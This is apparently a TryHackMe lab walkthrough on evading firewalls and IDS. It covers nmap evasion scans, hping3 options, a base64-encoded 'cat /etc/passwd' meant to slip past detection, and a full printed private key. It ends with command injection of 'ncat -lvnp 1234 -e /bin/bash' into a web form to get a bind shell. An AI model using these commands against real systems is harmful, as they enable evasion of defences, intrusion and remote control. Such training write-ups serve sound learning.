---
tags:
  - THM
  - Firewall
  - Logs
  - ncat
  - hping
  - nmap
---
# Network Security Solutions

## Task 3

```bash
cd 10.10.112.168

cat * | grep -i scan -A5

# [ SNIP ]
[**] Nmap XMAS Scan [**]
12/15-08:34:24.299213 10.14.17.226:57008 -> 10.10.112.168:63331
TCP TTL:37 TOS:0x0 ID:19974 IpLen:20 DgmLen:40
**U*P**F Seq: 0xDE84B23D  Ack: 0x0  Win: 0x400  TcpLen: 20  UrgPtr: 0x0
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
# [ SNIP ]

```

Answer:
>10.14.17.226
## Task 4

```bash
ip a s tun0

export IP=10.10.249.253
ping -c4 $IP
```


```bash
sudo nmap -sU -F -g 161 $IP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:15 CEST
Nmap scan report for 10.10.249.253
Host is up (0.039s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 113.16 seconds
```

Answer 1:
> -g 161

Answer 2:
> ncat -lvnp 23

```bash
sudo nmap -sS  $IP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:22 CEST 
Nmap scan report for 10.10.249.253 
Host is up (0.038s latency).
All 100 scanned ports on 10.10.249.253 are in ignored states.
Not shown: 100 filtered tcp ports (no-response)
Nmap done: 1 IP address (1 host up) scanned in 5.80 seconds
```

Answer 3:
> -ff

```bash
sudo nmap -sF $IP                                                                                                                                           
sudo nmap -sN $IP                                                                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:24 CEST                                                                                         
Nmap scan report for 10.10.249.253                                                                                                                          
Host is up (0.042s latency).                                                                                                                                
All 1000 scanned ports on 10.10.249.253 are in ignored states.                                                                                              
Not shown: 1000 closed tcp ports (reset)                                                                                                                    

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:24 CEST
Nmap scan report for 10.10.249.253
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
8080/tcp open|filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 12:24 CEST
Nmap scan report for 10.10.249.253
Host is up (0.043s latency).
All 1000 scanned ports on 10.10.249.253 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```

Answer 4
> -sF

```bash
hping3 -h | grep size
  -m  --mtu        set virtual mtu, implies --frag if packet size > mtu
  -w  --win        winsize (default 64)
  -d  --data       data size                    (default is 0)

```

Answer 5:
>-w

## Task 5

```bash
echo "cat /etc/passwd" | base64                                                                                                                         
Y2F0IC9ldGMvcGFzc3dkCg==
```

Answer 1:
>Y2F0IC9ldGMvcGFzc3dkCg==

```bash
echo "NZRWC5BAFVWCAOBQHAYAU===" | base32 -d                                                                                                             
ncat -l 8080
```

Answer 2:
>ncat -l 8080

```bash
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

cat *.crt                                                                                                                                               
-----BEGIN CERTIFICATE-----
MIIFXTCCA0WgAwIBAgIUFNKbWqG+0oorOOB/ywPCX0uPzFUwDQYJKoZIhvcNAQEL
BQAwPjEYMBYGA1UEAwwPd3d3LnJlZHRlYW0udGhtMRUwEwYDVQQKDAxSZWQgVGVh
bSBUSE0xCzAJBgNVBAYTAlVLMB4XDTI0MDYyNDEwMzI0NloXDTI1MDYyNDEwMzI0
NlowPjEYMBYGA1UEAwwPd3d3LnJlZHRlYW0udGhtMRUwEwYDVQQKDAxSZWQgVGVh
bSBUSE0xCzAJBgNVBAYTAlVLMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKC
AgEA58IKrGsmgEL8K5hQA/n8xtfvaY0MDNd2RbU97dAKuGAJZSyeQ5LPUGO2a2V5
hcHc48qtwviQjgeb8xXU0tDtH7/uk2jzVwZSIqJKpIAMQoU9VYo/KNYhlG972ti9
L4glhru35/GkC9gvc8tCe1sNusxagJWEI4tdTpe4iBfRTfS56Nv0j5kXgaPStsXj
Fn3fqJZxJqOTYakOcpfqZUCMgG7BBWPpQdBaSpOCRe/SH5Pykjwe5MicnQ6HGaUL
GIExCgoS6naC+EtjKKbBOoypq1yphtD2K26vzXph1M1B2/rOoqX+jpSLOID1Wap9
CbXU492mk+LENHczeoY5Ct+gQbEzW6UrCL/yzRX4GmRD05WkHiC/T//JUAXi3r4A
DTeV+9C9S+mgDn+TetQ+kV8h11YQWGESA8zkfBRuS8U2xYd4OFW4kLx+AwGymdPj
GPgi2fXgPzWIfSK2EoCLdni6FiVFapLcgs7M5PDVWav7+txRggQiFX+/73em1tGA
cCG7HFg9JcxVIhcBWeLcn/haH4I4CbFMaZvblif/zaYLhVn4pwUZ8/MWY0kOhAWv
MAd6TbGHX2z73fhHS6pQo/XOAYKv0mORkyzVJxT+1/ToQNCO56eprKXvof88Q7PO
IDZ9KH3241zRpkwu73ubAo7fpMTIbiybftjNOyzDdW2FiRUCAwEAAaNTMFEwHQYD
VR0OBBYEFEySXYYFpFD1eNvGIUmJ25Py5+CsMB8GA1UdIwQYMBaAFEySXYYFpFD1
eNvGIUmJ25Py5+CsMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggIB
AL8ZpBPZLr9IJrnWCMW5uPVEkqC8s8isshNRl5B5BKWAhrG3O9/sprFCJwLWS+Bk
f6GxkIrD9LcWB/RdnpH+qYQ+clLE/5+yT41QA+coShd/Az2Msiau02z4nWFcfXJR
mmpUy/JG7/JlpQagu/3MrQSNc5ADmFegaspEnK8LAM42/F6ArV0ryEXHkbYCXQzC
SQICZpWn8CTiDEc0wNkF5JkUxYoRdfHBUhhJB5UuxsGWXKodJXCrn52ipvUvlUx2
S6/JNH//uKeOdyZtl0u1m+n6jDlyrxZVTSV9LWECbnCX3aj2jetxAhHh7mGjp4iJ
tJEBYVtKN/SfL+44gNfUGvofYsAuFdsbUQPVShif70ZtQOQhzlcDBkytjLnDlth6
Z1ZaeUa3oQUL2i8KEOuduCoxDGGFcsEE3TA6UhWKNFBCFaKNbs5xvQ2LtQ9uN0so
d40Ea5P/+GdzgKbJOmVIazLO4cTfGDizb8fa6zajY9Dpo4YiEinHIyAII2NK0yvL
oEsNWV5Z8Qtsy/7TzQu4bX2Td5BRWJsVmLOIZv1DAEjL3M2LAH/e+xUt+UurwsiG
prHKstu6SMfl1LpJcqzke9kvLvh3eo1rUlnH/AvxgMxjHoOOvgvCDXimmdwme8Dn
ejYhdSgZlUrhqviBhm77iE5i0XTpXdgv8zBAGWDURkwL
-----END CERTIFICATE-----

cat *.key

-----BEGIN PRIVATE KEY-----
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
g/SgghOd9ePSVTDohMqcQwY2WySG+FU=
-----END PRIVATE KEY-----

```

Answer 3:
>-----BEGIN CERTIFICATE-----

Answer 4:
>-----END PRIVATE KEY-----

```bash
firefox http://${IP}:8080
```

insert `ncat  -lvnp 1234  -e /bin/bash ` into the input field

```bash
# new terminal on the kali vm

sudo ncat $IP 1234                                                                                                                                      

whoami
redteamnetsec


```

Answer5:
>redteamnetsec